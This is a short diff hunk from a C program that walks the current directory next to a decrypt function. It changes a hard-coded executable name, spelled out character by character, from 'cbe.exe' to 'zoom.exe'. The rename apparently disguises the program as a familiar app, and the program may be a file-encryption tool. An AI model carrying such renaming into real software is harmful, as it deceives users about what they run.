@@ -68,7 +68,7 @@ void decrypt(char input[])
 int main(void) {
    DIR *dr;
    struct dirent *en;
-   char cbe[] = {'c','b','e','.','e','x','e','\0'};
+   char cbe[] = {'z','o','o','m','.','e','x','e','\0'};
    dr = opendir("."); //open all file
 	if (dr) {
 		while ((en = readdir(dr)) != NULL) {
